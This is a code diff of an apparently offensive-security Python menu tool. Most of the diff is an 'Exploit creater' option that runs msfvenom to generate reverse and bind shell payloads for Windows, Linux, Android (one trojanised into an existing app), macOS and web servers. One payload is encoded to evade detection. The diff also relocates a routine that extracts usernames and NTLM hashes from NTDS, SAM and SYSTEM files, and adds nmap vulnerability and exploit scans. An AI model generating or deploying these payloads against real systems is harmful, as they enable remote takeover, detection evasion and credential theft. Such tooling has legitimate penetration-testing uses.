-      if checkParams != 1:
-         print(colored("[*] Creating windows exploits...", colour3))         
-
-         localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")         
-         localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_http_reverse_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_https_reverse_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x64_macro.vba >> arsenal.tmp 2>&1")         
-         if TIP[:5] != "EMPTY":
-            localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_shell.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_hidden_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_normal_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_http_reverse_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_https_reverse_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x86_macro.vba >> arsenal.tmp 2>&1")         
-         localCOM("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_bind_shell.exe >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports	 LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_allports_reverse_shell.exe >> arsenal.tmp 2>&1")         
-         localCOM("msfvenom -p cmd/windows/reverse_powershell  		 LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/win_powershell.bat >> arsenal.tmp 2>&1")
-         
-         print(colored("[*] Creating linux exploits...", colour3))
-         localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_shell.elf >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_shell.elf >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_http_shell.elf >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_http_shell.elf >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_multi_bind_shell.elf >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_single_bind_shell.elf >> arsenal.tmp 2>&1")
-         
-         print(colored("[*] Creating android exploits...", colour3))
-#        localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_embed_shell.apk >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_http_shell.apk >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_https_shell.apk >> arsenal.tmp 2>&1")
-         
-         print(colored("[*] Creating mac exploits...", colour3))
-         localCOM("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_reverse_shell.macho >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_bind_shell.macho >> arsenal.tmp 2>&1")
-         
-         print(colored("[*] Creating other exploits...", colour3))
-         localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/web_reverse_shell.php >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/java_reverse_shell.jsp >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/asp_reverse_shell.asp >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/war_reverse_shell.war >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/bash_reverse_shell.sh >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/python_reverse_shell.py >> arsenal.tmp 2>&1")
-         localCOM("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/perl_reverse_shell.pl >> arsenal.tmp 2>&1")
-         
-         # ANTI WAF ----         
-         localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/win_encoded_shell.exe >> arsenal.tmp 2>&1")
-
-         localCOM("chmod +X *.*")            
-      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3139,7 +3142,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      remotCOM("nmap --script vuln " + TIP.rstrip(" ") + " --reason")
+      checkParams = test_TIP()
+      if checkParams != 1:
+         if POR[:5] != "EMPTY":
+            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
+            remotCOM("nmap -p " + PTS + " --script vuln " + TIP.rstrip(" ") + " --reason")
+         else:
+            print("[-] No ports to scan...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3151,7 +3160,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='68':
-      remotCOM("nmap --script exploit " + TIP.rstrip(" ") + " --reason")
+      checkParams = test_TIP()
+      if checkParams != 1:
+         if POR[:5] != "EMPTY":
+            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
+            remotCOM("nmap -p " + PTS  + "--script exploit " + TIP.rstrip(" ") + " --reason")
+         else:
+            print("[-] No ports to scan...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3180,11 +3195,81 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
+# Details : Menu option selected - Exploit creater
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='70':                 
+      checkParams = getPort()
+      
+      if checkParams != 1:
+         if OSF == "WINDOWS":
+            print(colored("[*] Creating windows exploits...", colour3))         
+            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")         
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_http_reverse_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_https_reverse_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x64_macro.vba >> arsenal.tmp 2>&1")         
+            if TIP[:5] != "EMPTY":
+               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_shell.exe >> arsenal.tmp 2>&1")
+               localCOM("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_hidden_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_normal_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_http_reverse_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_https_reverse_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x86_macro.vba >> arsenal.tmp 2>&1")         
+            localCOM("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_bind_shell.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports	 LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_allports_reverse_shell.exe >> arsenal.tmp 2>&1")         
+            localCOM("msfvenom -p cmd/windows/reverse_powershell  		 LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/win_powershell.bat >> arsenal.tmp 2>&1")
+            
+# ANTI WAF ----         
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/win_encoded_shell.exe >> arsenal.tmp 2>&1")
+       
+         if OSF == "LINUX":
+            print(colored("[*] Creating linux exploits...", colour3))
+            localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_shell.elf >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_shell.elf >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_http_shell.elf >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_http_shell.elf >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_multi_bind_shell.elf >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_single_bind_shell.elf >> arsenal.tmp 2>&1")
+         
+         if OSF == "ANDROID":
+            print(colored("[*] Creating android exploits...", colour3))
+#           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_embed_shell.apk >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_http_shell.apk >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_https_shell.apk >> arsenal.tmp 2>&1")
+         
+         if OSF == "OS X":
+            print(colored("[*] Creating mac exploits...", colour3))
+            localCOM("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_reverse_shell.macho >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_bind_shell.macho >> arsenal.tmp 2>&1")
+
+         if OSF == "IOS":
+            print(colored("[*] Creating ios exploits...", colour3))
+            print("NOT IMPLEMENTED")
+            
+         print(colored("[*] Creating other exploits that you might require...", colour3))
+         localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/web_reverse_shell.php >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/java_reverse_shell.jsp >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/asp_reverse_shell.asp >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/war_reverse_shell.war >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/bash_reverse_shell.sh >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/python_reverse_shell.py >> arsenal.tmp 2>&1")
+         localCOM("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/perl_reverse_shell.pl >> arsenal.tmp 2>&1")
+         
+         localCOM("chmod +X *.*")            
+
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
 # Details : Menu option selected - Nano file editor
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='70':
+   if selection =='71':
       print("[!] (1) USER NAMES (2) PASS WORDS (3) NTLM HASHES (4) HOSTS CONFIG (5) RESOLV CONFIG (6) PROXYCHAINS CONFIG (7) KERB5 CONFIG")
       
       checkParams = 0
@@ -3240,7 +3325,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='71':
+   if selection =='72':
       checkParams = test_TIP()    
         
       if checkParams != 1:
@@ -3265,7 +3350,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='72':
+   if selection =='73':
       checkParams = test_TIP()           
       
       if checkParams != 1:
@@ -3286,7 +3371,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='73':
+   if selection =='74':
       checkParams = getPort()      
       
       if HTTP == 0:
@@ -3324,7 +3409,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':
+   if selection =='75':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -3447,7 +3532,7 @@ while True:
 # Note    : Alternative dictionary - /usr/share/dirb/wordlists/common.txt
 # -------------------------------------------------------------------------------------
 
-   if selection =='75':
+   if selection =='76':
       checkParams = test_TIP()                 
       
       if checkParams != 1:
@@ -3468,7 +3553,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='76':
+   if selection =='77':
       if IP46 == "-4":
          checkParams = test_TIP()
       else:
@@ -3485,67 +3570,6 @@ while True:
             else:
                remotCOM("nikto -h " + TIP.rstrip(" "))              
       prompt()  
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='77':           
-      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))  
-          
-      if os.path.exists("./" + workDir + "/ntds.dit"):
-         print("[+] File ntds.dit found...")
-      else:
-         print("[-] File ntds.dit not found, checking for SAM...")
-         
-         if os.path.exists("./" + workDir + "/SAM"):
-            print("[+] File SAM found...")
-         else:
-            print("[-] File SAM not found...")
-            checkParams =1         
-            
-      if os.path.exists("./" + workDir + "/SYSTEM"):
-         print("[+] File SYSTEM found...")
-      else:
-         print("[-] File SYSTEM not found...")
-         checkParams = 1         
-         
-      if os.path.exists("./" + workDir + "/SECURITY"):
-         print("[+] File SECURITY found...")
-      else:
-         print("[-] File SECURITY not found")
-         checkParams = 1         
-         
-      if checkParams != 1:
-         print(colored("[*] Extracting stored secrets, please wait...", colour3))
-         
-         if os.path.exists("./" + workDir + "/SAM"):
-            remotCOM(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
-            localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
-            localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
-         else:
-            remotCOM(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
-            localCOM("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
-            localCOM("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")        
-            
-         print("[+] Importing extracted secrets...")         
-         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
-           for x in range (0, maxUser):
-               USER[x] = read1.readline().rstrip("\n")
-               USER[x] = spacePadding(USER[x], COL3)                  
-               HASH[x] = read2.readline().rstrip("\n")
-               
-               if USER[x] != "":
-                  HASH[x] = spacePadding(HASH[x], COL4)
-               else:
-                  HASH[x] = dotPadding(HASH[x], COL4)
-               VALD[x] = "0"               
-         wipeTokens(VALD)        
-      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3568,7 +3592,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected -
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -3621,11 +3645,62 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - NTDS DECRYPT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='83':
+      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))  
+          
+      if os.path.exists("./" + workDir + "/ntds.dit"):
+         print("[+] File ntds.dit found...")
+      else:
+         print("[-] File ntds.dit not found, checking for SAM...")
+         
+         if os.path.exists("./" + workDir + "/SAM"):
+            print("[+] File SAM found...")
+         else:
+            print("[-] File SAM not found...")
+            checkParams =1         
+            
+      if os.path.exists("./" + workDir + "/SYSTEM"):
+         print("[+] File SYSTEM found...")
+      else:
+         print("[-] File SYSTEM not found...")
+         checkParams = 1         
+         
+      if os.path.exists("./" + workDir + "/SECURITY"):
+         print("[+] File SECURITY found...")
+      else:
+         print("[-] File SECURITY not found")
+         checkParams = 1         
+         
+      if checkParams != 1:
+         print(colored("[*] Extracting stored secrets, please wait...", colour3))
+         
+         if os.path.exists("./" + workDir + "/SAM"):
+            remotCOM(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
+            localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
+            localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
+         else:
+            remotCOM(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+            localCOM("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
+            localCOM("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")        
+            
+         print("[+] Importing extracted secrets...")         
+         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
+           for x in range (0, maxUser):
+               USER[x] = read1.readline().rstrip("\n")
+               USER[x] = spacePadding(USER[x], COL3)                  
+               HASH[x] = read2.readline().rstrip("\n")
+               
+               if USER[x] != "":
+                  HASH[x] = spacePadding(HASH[x], COL4)
+               else:
+                  HASH[x] = dotPadding(HASH[x], COL4)
+               VALD[x] = "0"               
+         wipeTokens(VALD) 
+         
       prompt()
       
 # ------------------------------------------------------------------------------------- 
